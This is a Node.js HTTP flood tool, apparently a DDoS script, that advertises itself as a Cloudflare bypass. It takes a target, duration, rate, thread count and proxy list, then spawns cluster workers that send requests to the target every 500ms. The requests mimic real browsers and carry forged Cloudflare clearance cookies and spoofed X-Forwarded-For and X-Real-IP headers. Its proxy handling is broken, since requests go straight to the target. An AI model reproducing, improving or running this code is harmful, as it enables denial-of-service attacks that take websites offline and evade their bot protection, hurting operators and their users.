const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const https = require("https");
const http = require("http");

const blue = '\x1b[34m';
const white = '\x1b[37m';
const green = '\x1b[32m';
const yellow = '\x1b[33m';
const red = '\x1b[31m';
const reset = '\x1b[0m';

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// ========== BROWSER REAL FINGERPRINT ==========
const realBrowsers = [
    {
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        sec_ch_ua: '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
        sec_ch_ua_platform: '"Windows"',
        sec_ch_ua_mobile: '?0'
    },
    {
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        sec_ch_ua: '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"',
        sec_ch_ua_platform: '"Windows"',
        sec_ch_ua_mobile: '?0'
    },
    {
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        sec_ch_ua: '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
        sec_ch_ua_platform: '"macOS"',
        sec_ch_ua_mobile: '?0'
    },
    {
        ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        sec_ch_ua: '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
        sec_ch_ua_platform: '"Linux"',
        sec_ch_ua_mobile: '?0'
    },
    {
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        sec_ch_ua: '"Firefox";v="133"',
        sec_ch_ua_platform: '"Windows"',
        sec_ch_ua_mobile: '?0'
    }
];

const realReferers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://github.com/"
];

const realPaths = [
    "/",
    "/index.html",
    "/home",
    "/main",
    "/api/v1/status",
    "/api/v2/health",
    "/assets/js/main.js",
    "/assets/css/style.css",
    "/images/logo.png",
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/acme-challenge/",
    "/wp-json/wp/v2/posts",
    "/api/users",
    "/api/auth",
    "/api/products",
    "/api/cart",
    "/api/checkout",
    "/api/payment"
];

// ========== ARGUMEN ==========
if (process.argv.length < 7) {
    console.log(`${red}Usage: node repz_bypass.js <target> <time> <rate> <threads> <proxy.txt>${reset}`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
let proxies = [];

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && !line.startsWith('#'));
    } catch(e) { return []; }
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function generateCFCookie() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let cookie = '';
    for (let i = 0; i < 32; i++) {
        cookie += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return `__cf_bm=${cookie}; _cfuvid=${crypto.randomBytes(16).toString('hex')}; cf_clearance=${crypto.randomBytes(20).toString('hex')}`;
}

function ip_spoof() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

// ========== CLUSTER MASTER ==========
if (cluster.isMaster) {
    console.clear();
    console.log(`${green}============================================`);
    console.log(`${yellow}🔥 ZANGXX BYPASS CLOUDFLARE 🔥`);
    console.log(`${green}============================================`);
    console.log(`${white}Target: ${args.target}`);
    console.log(`Time: ${args.time}s | Rate: ${args.Rate}/s | Threads: ${args.threads}`);
    console.log(`Proxy: ${args.proxyFile}`);
    console.log(`${green}============================================`);
    console.log(`${yellow}[+] Mode: LOW & SLOW BYPASS (Real Browser Fingerprint)`);
    console.log(`${green}[+] Attack started...${reset}`);

    proxies = readLines(args.proxyFile);
    console.log(`${green}[+] Loaded ${proxies.length} proxies${reset}`);

    for (let i = 1; i <= args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runBypass, 500); // 500ms interval biar ga terlalu agresif
}

// ========== BYPASS ENGINE ==========
function runBypass() {
    if (proxies.length === 0) {
        proxies = readLines(args.proxyFile);
        if (proxies.length === 0) {
            console.log(`${red}[!] No proxies available${reset}`);
            return;
        }
    }

    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyHost = parsedProxy[0];
    const proxyPort = ~~parsedProxy[1] || 8080;

    const browser = randomElement(realBrowsers);
    const targetPath = randomElement(realPaths);
    const randomQuery = `?${crypto.randomBytes(4).toString('hex')}=${crypto.randomBytes(8).toString('hex')}`;
    const fullPath = targetPath + randomQuery;
    const referer = randomElement(realReferers);
    const method = Math.random() < 0.7 ? "GET" : "POST";

    // ========== BUILD HEADER SEPERTI BROWSER REAL ==========
    const headers = {
        "Host": parsedTarget.host,
        "User-Agent": browser.ua,
        "Accept": browser.accept,
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en;q=0.8,en-US;q=0.7",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Ch-Ua": browser.sec_ch_ua,
        "Sec-Ch-Ua-Platform": browser.sec_ch_ua_platform,
        "Sec-Ch-Ua-Mobile": browser.sec_ch_ua_mobile,
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": Math.random() < 0.5 ? "same-origin" : "cross-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Referer": referer,
        "Cookie": generateCFCookie(),
        "X-Forwarded-For": ip_spoof(),
        "X-Real-IP": ip_spoof(),
        "Connection": "keep-alive"
    };

    if (method === "POST") {
        headers["Content-Type"] = "application/x-www-form-urlencoded";
    }

    const options = {
        host: proxyHost,
        port: proxyPort,
        path: fullPath,
        method: method,
        headers: headers,
        timeout: 8000,
        rejectUnauthorized: false,
        agent: false // ga pake agent biar fresh
    };

    // ========== KIRIM REQUEST VIA PROXY ==========
    const req = (parsedTarget.protocol === 'https:')
        ? https.request({
            ...options,
            host: parsedTarget.host,
            port: 443,
            headers: {
                ...headers,
                "Host": parsedTarget.host
            }
        })
        : http.request({
            ...options,
            host: parsedTarget.host,
            port: 80
        });

    req.on('response', (res) => {
        const status = res.statusCode;
        if (status === 200 || status === 301 || status === 302 || status === 303) {
            // BYPASS SUKSES! 
        }
        req.destroy();
    });

    req.on('error', () => {
        req.destroy();
    });

    // kirim body kalo POST
    if (method === "POST") {
        const body = `key=${crypto.randomBytes(8).toString('hex')}&value=${crypto.randomBytes(12).toString('hex')}`;
        req.write(body);
    }

    req.end();
}

// ========== SHUTDOWN ==========
setTimeout(() => {
    console.log(`${red}[!] Attack finished!${reset}`);
    process.exit(1);
}, args.time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});